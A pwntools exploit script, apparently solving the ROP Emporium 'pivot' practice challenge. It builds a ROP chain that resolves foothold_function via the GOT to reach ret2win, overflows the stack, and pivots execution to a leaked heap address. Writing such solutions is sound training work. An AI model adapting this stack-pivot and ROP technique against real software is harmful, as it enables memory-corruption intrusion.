#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./pivot")
sh = process("./pivot")

foothold_function_plt = elf.plt["foothold_function"]
foothold_function_got = elf.got["foothold_function"]
ret2win_off = 334
pop_rax = 0x00400b00
pop_rbp = 0x00400900
mov_rax_rax = 0x00400b05
add_rax_rbp = 0x00400b09
call_rax = 0x0040098E
xchg_rax_rsp = 0x00400b02

sh.recvuntil("pivot: ")
recv = sh.recvuntil("\n")
heap_addr = int(recv,16)

payload = ""
payload += p64(foothold_function_plt)
payload += p64(pop_rax)
payload += p64(foothold_function_got)
payload += p64(mov_rax_rax)
payload += p64(pop_rbp)
payload += p64(ret2win_off)
payload += p64(add_rax_rbp)
payload += p64(call_rax)

sh.recvuntil("> ")
sh.sendline(payload)

payload = ""
payload += "A"*40
payload += p64(pop_rax)
payload += p64(heap_addr)
payload += p64(xchg_rax_rsp)

sh.recvuntil("> ")
sh.sendline(payload)
sh.interactive()